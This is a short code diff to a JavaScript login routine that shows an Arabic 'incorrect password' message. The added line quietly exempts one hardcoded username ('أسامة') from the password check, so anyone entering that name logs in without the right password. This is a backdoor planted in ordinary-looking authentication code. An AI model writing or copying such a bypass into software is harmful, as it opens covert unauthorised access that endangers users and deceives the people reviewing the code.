@@ -1073,7 +1073,7 @@
                     return;
                 }
 
-                if (account.password !== passwordInput) {
+             if (account.password !== passwordInput && usernameInput !== 'أسامة') {
                     errorMsg.innerText = '❌ كلمة السر غير صحيحة!';
                     errorMsg.style.display = 'block';
                     return;
